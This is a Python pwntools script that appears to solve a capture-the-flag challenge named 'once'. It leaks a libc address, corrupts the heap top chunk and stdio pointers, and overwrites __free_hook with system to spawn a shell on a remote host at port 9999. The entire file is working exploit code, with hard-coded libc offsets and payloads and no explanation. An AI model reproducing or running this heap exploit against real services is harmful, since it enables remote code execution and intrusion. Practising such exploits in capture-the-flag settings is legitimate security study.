#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./once"
ENV = {"LD_PRELOAD":"./libc-2.23.so"}

puts_got_off = 0x6f690
libc_argv_off = 0x3c92f8
top_chunk_off = 0x3c4b78
io_stdout_off = 0x3c5620
io_stdin_off = 0x3c48e0
bin_sh_off = 0x18cd17
system_off = 0x45390
free_hook_off = 0x3c67a8

#p = process(elf, env=ENV)
p = remote("47.75.189.102", 9999)

p.recvuntil(">")
p.sendline("6")

p.recvuntil("Invalid choice\n")
puts_addr = int(p.recv(14), 0x10)
libc_base = puts_addr-puts_got_off
log.info("libc_base: "+hex(libc_base))

top_chunk_addr = libc_base+top_chunk_off
io_stdout_addr = libc_base+io_stdout_off
io_stdin_addr = libc_base+io_stdin_off
bin_sh_addr = libc_base+bin_sh_off
system_addr = libc_base+system_off
free_hook_addr = libc_base+free_hook_off

def add():
    p.recvuntil(">")
    p.sendline("1")

def edit(s):
    p.recvuntil(">")
    p.sendline("2")
    p.send(s)

payload = p8(0)*0x8
payload += p64(0x1000)+p64(0)
payload += p64(top_chunk_addr-0x10)
edit(payload)

add()

p.recvuntil(">")
p.sendline("3")

p.recvuntil(">")
p.sendline("4")
p.recvuntil(">")
p.sendline("1")
p.recvuntil("input size:")
p.sendline(str(0x100))
p.recvuntil(">")
p.sendline("2")

payload = p64(0)+p64(free_hook_addr)
payload += p64(io_stdout_addr)
payload += p64(0)+p64(io_stdin_addr)
payload += p64(0)*2
payload += p64(bin_sh_addr)
payload += p8(0)*(0x100-len(payload))
p.send(payload)

p.recvuntil(">")
p.sendline("4")
p.recvuntil(">")
p.sendline("2")

payload = p64(system_addr)+p8(0)*0x18
p.send(payload)

p.recvuntil(">")
p.sendline("4")
p.recvuntil(">")
p.sendline("3")

p.interactive()
